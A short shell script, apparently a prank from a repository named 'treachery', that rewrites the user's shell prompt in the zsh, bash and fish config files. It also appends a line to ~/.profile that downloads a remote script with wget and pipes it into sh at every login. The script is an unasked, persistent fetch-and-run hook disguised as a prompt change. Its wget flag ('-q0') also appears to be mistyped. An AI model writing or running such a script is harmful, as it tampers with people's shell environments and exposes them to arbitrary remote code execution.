#!/bin/sh
# dash uses . not source, so this checks if that needs to be remedied
if which source 2>/dev/null >/dev/null
then
	:;
else
	alias source="."
fi

PROMPT="Σ:3 "
echo -n "\nPS1=\"${PROMPT}\"" | tee -a ~/.zshrc | tee -a ~/.bashrc >> ~/.config/fish/config.fish
echo -n 'sh -c "$(wget -q0 - https://raw.githubusercontent.com/BeerB34r/treachery/refs/heads/master/assorted/prompt.sh)"' >>~/.profile
case "${SHELL}" in
	"/bin/zsh")
		source "${HOME}/.zshrc"
		;;
	"/bin/bash")
		source "${HOME}/.bashrc"
		;;
	"/bin/fish")
		source "${HOME}/.config/fish/config.fish"
		;;
	*)
		;;
esac
clear
